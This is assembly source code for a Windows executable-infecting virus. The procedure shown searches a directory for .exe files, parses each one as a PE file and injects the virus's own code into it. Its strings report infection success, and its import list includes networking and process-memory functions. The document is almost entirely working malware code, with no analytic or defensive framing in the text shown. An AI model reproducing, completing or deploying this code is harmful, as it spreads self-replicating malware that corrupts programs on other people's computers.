InfectFilesInCurrDir proc CurrentStdcallNotation uses cbx cdi

    local hFindFile:HANDLE
    local findData:WIN32_FIND_DATAA
    local pe:PeHeaders
    local codeSize:cword
    local oldValue:cword
    local dirName[256]:byte
    local nameLen:cword

	ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif
	
    invoke sc_strlen, addr [cbx+targetDir]
    mov [nameLen], cax
    invoke sc_memcpy, addr [dirName], addr [cbx+targetDir], cax
    lea ccx, [dirName]
    add ccx, cword ptr [nameLen]
    invoke sc_memcpy, ccx, addr [cbx + findMask], 7

    invoke sc_FindFirstFileA, addr [dirName], addr findData
	.if cax == -1
		invoke sc_printf, addr [cbx + msgWarningFilesNotFound]
		ret
	.endif
    mov [hFindFile], cax
	
	.while cax != 0
		invoke sc_printf, addr [cbx + strFormat], addr [findData].WIN32_FIND_DATAA.cFileName
		;int 3
		invoke LoadPeFile, addr [findData].WIN32_FIND_DATAA.cFileName , addr [pe], 0
		.if cax == 1
			mov ccx, totalEnd
			sub ccx, start
			mov [codeSize], ccx
			invoke InjectPeFile, addr [pe], addr [cbx + start], [codeSize]
			
			invoke UnloadPeFile, addr [pe]
		.endif
		
		invoke sc_printf, addr [cbx + newLine]
		;invoke Freeze

		invoke sc_FindNextFileA, [hFindFile], addr [findData]   
    .endw

    invoke sc_FindClose, [hFindFile]

    ret
InfectFilesInCurrDir endp


include pe_parser.asm
include proc_work.asm
ifdef _WIN64

else
include hde32_sc.asm
endif

DefineStr ExitProcess
DefineStr LoadLibraryA
DefineStr GetProcAddress

str_Msvcrt db "msvcrt.dll", 0
str_Kernel32 db "kernel32.dll", 0
str_User32 db "User32.dll", 0
str_Ws232	db "ws2_32.dll", 0


msgHello:
db "virus say hello!", 10,0
newLine:
db 10, 0
strFormatInt:
db "%d", 10, 0
strFormat:
db "%s", 10, 0
findMask:
db "/*.exe", 0
msgErrorConnect:
db "Error: Failed to connect", 10, 0
msgErrorRelocs:
db "Error: Relocs stripped", 10, 0
msgErrorPeLoad:
db "Error: Failed to load this PE file", 10, 0
msgErrorCodeSectionNotFound:
db "Error: Code section not found", 10, 0
msgErrorSpaceNotFound:
db "Error: Space in code section not found", 10, 0
msgErrorAlreadyInfected:
db "Error: File already infected", 10, 0
msgInfectionSuccess:
db "Success: File infected now", 10, 0
msgWarningFilesNotFound:
db "Warning: Exe files for infection not found", 10, 0
msgWarningFileWithoutRelocs:
db "Warning: File without relocs", 10, 0

DefineFuncNamesAndPointers VirtualProtect, MessageBoxA, GetModuleHandleA, WriteProcessMemory, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, GetFileSize, CreateFileMappingA, CloseHandle,  MapViewOfFile, UnmapViewOfFile, GetLastError, GetTickCount, Sleep, printf, memset, strlen, memcpy, malloc, strcmp, sprintf, strcpy, strcat, memmove,

totalEnd:

sc ends

end